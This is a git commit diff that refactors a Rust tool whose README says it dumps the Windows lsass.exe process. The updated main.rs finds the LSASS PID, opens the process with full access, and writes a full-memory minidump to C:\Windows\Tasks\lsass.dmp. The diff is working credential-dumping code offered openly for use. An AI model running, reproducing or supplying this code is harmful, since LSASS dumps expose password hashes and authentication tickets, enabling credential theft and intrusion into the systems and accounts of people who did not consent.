b52573286d45c01c5c5266dd5b831f8eca25437c
joaoviictorti <joaovictorti08@gmail.com>
2025-04-28 20:04:36 -0300

    refactor: code cleanup & minor fixes

--- Minidump/README.md
+++ Minidump/README.md
@@ -1,30 +1,16 @@
-# minidump-rs 🦀
+# minidump 🦀
 
-<p align="left">
-	<a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/made%20with-Rust-red"></a>
-	<a href="#"><img src="https://img.shields.io/badge/platform-windows-blueviolet"></a>
-</p>
+This repository presents code written in Rust designed to dump the `lsass.exe` process.
 
-- [Overview](#overview)
-- [Running](#running)
-- [Usage](#usage)
-
-# Overview
-
-This repository presents code written in Rust designed to dump the lsass.exe process
-
-# Running
+## Running
 
 Dumping the lsass process
 
 ![poc](img/dump.png)
 
-# Usage
+## Usage
 
 You can run with cargo run or the compiled binary directly:
 ```sh
-cargo run
-```
-```sh
-target/release/minidump-rs.exe
+cargo run --release
 ```
--- Minidump/src/main.rs
+++ Minidump/src/main.rs
@@ -1,61 +1,70 @@
-use std::{ffi::CString, ptr::null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::core::PCSTR;
-use windows::Win32::Foundation::{CloseHandle, HANDLE};
+use windows::core::{Error, Result, PCSTR};
+use windows::Win32::Foundation::{CloseHandle, E_FAIL};
 use windows::Win32::Storage::FileSystem::{
-    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ,
-    FILE_SHARE_WRITE,
+    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 
+    FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
 };
 use windows::Win32::System::{
     Diagnostics::Debug::{
-        MiniDumpWithFullMemory, MiniDumpWriteDump
+        MiniDumpWithFullMemory, 
+        MiniDumpWriteDump
     }, 
     Threading::{
-        OpenProcess, PROCESS_ALL_ACCESS
+        OpenProcess, 
+        PROCESS_ALL_ACCESS
     }
 };
 
-fn find_lsass() -> Result<u32, &'static str> {
+/// Finds the PID of the LSASS process (`lsass.exe`).
+///
+/// # Returns
+///
+/// * `Ok(u32)` - The PID of the LSASS process if found.
+/// * `Err` - If the process is not found.
+fn find_lsass() -> Result<u32> {
     let mut system = System::new_all();
     system.refresh_all();
 
-    let lsass_processes: Vec<_> = system
+    let processes = system
         .processes()
         .values()
         .filter(|process| process.name().to_lowercase() == "lsass.exe")
-        .collect();
+        .collect::<Vec<_>>();
 
-    for process in lsass_processes {
-        println!("[i] LSASS process with PID found: {}", process.pid());
-
+    if let Some(process) = processes.into_iter().next() {
+        println!("[+] LSASS process with PID found: {}", process.pid());
         return Ok(process.pid().as_u32());
     }
 
-    return Err("Error finding lsass PID!");
+    Err(Error::new(E_FAIL, "Error finding lsass PID!".into()))
 }
 
-fn main() -> Result<(), Box<dyn std::error::Error>>{
+fn main() -> Result<()> {
     unsafe {
-        let pid_lsass = find_lsass()?;
-        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass)?;
-        let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");
-        let hfile = CreateFileA(
+        // Find the PID of the LSASS process
+        let pid = find_lsass()?;
+
+        // Open a handle to the LSASS process with full access rights
+        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
+        
+        // Create a new file to store the LSASS dump
+        let path = c"C:\\Windows\\Tasks\\lsass.dmp";
+        let h_file = CreateFileA(
             PCSTR(path.as_ptr() as *const u8),
             FILE_GENERIC_WRITE.0,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
-            Some(null_mut()),
+            None,
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
-            HANDLE(0),
+            None,
         )?;
 
-        println!("[+] HANDLE lsass.exe: {:?}", hprocess);
-        println!("[+] PID: {:?}", pid_lsass);
-
+        // Write the full memory dump of the LSASS process into the file
         MiniDumpWriteDump(
-            hprocess,
-            pid_lsass,
-            hfile,
+            h_process,
+            pid,
+            h_file,
             MiniDumpWithFullMemory,
             None,
             None,
@@ -63,9 +72,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>>{
         )?;
 
         println!("[+] lsass dump successful!");
-
-        CloseHandle(hprocess)?;
-        CloseHandle(hfile)?;
+        CloseHandle(h_process)?;
+        CloseHandle(h_file)?;
     }
 
     Ok(())
